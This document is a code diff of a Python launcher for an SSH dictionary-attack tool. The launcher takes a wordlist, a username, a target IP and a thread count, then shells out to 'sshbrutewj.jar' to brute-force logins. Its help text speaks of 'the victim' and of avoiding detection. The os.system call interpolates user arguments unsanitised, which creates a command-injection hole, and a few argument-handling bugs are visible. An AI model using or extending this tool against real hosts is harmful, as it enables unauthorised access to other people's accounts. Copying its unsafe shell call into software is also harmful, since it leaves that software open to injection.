@@ -8,24 +8,23 @@ def output_text(color:Fore, text:str):
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('-w', help='The wordlist file path for the dictionary attack', required=True, type=str)
-    parser.add_argument('-u', help='User', required=True, type=str)
+    parser.add_argument('-u', help='Username of the account', required=True, type=str)
     parser.add_argument('-i', help='IP', required=True, type=str)
-    parser.add_argument('-p', help='Port', required=True, type=str)
-    parser.add_argument('-v', help='Verbose', required=False, type=str)
+    parser.add_argument('-p', help='Port', required=False, type=int, default=22)
+    parser.add_argument('-v', help='Verbose mode', required=False, type=bool, default=False)
     parser.add_argument('-t', help='The number of threads you wish to use. The more threads used the faster \
-                        but could lead to some problems and easily notify the victim.', type=int)
+                        but could lead to some problems and easily notify the victim.', type=int, default=1)
     return parser.parse_args()
 
-def load_main(wordlist, thread_count, ip, port, user):
+def load_main(ip, port, username, wordlist, thread_count, verbose_mode):
     # the run command goes here with the args
     output_text(Fore.GREEN, "Everything was good. Loading main file...")
-    os.system(f"java -jar sshbrutewj.jar {ip} {port} {user} {wordlist} {thread_count}")
+    os.system(f"java -jar sshbrutewj.jar {ip} {port} {username} {wordlist} {thread_count} {verbose_mode}")
 
 if __name__ == '__main__':
     if os.name == 'nt':
-        pass
-    elif os.name == 'posix':
-        pass
+        output_text(Fore.RED, "Suport for windows will be in the future")  
+        exit()
 
     args = parse_args()
     wordlist = args.w
@@ -42,7 +41,6 @@ if __name__ == '__main__':
         exit()
 
     if thread_count == None:
-        thread_count = 1
         output_text(Fore.YELLOW, f"Thread count was not set and will automatically be {thread_count}")
 
-    load_main(wordlist, thread_count, ip_addr, port, user)
+    load_main(ip_addr, port, user, wordlist, thread_count, verbose)
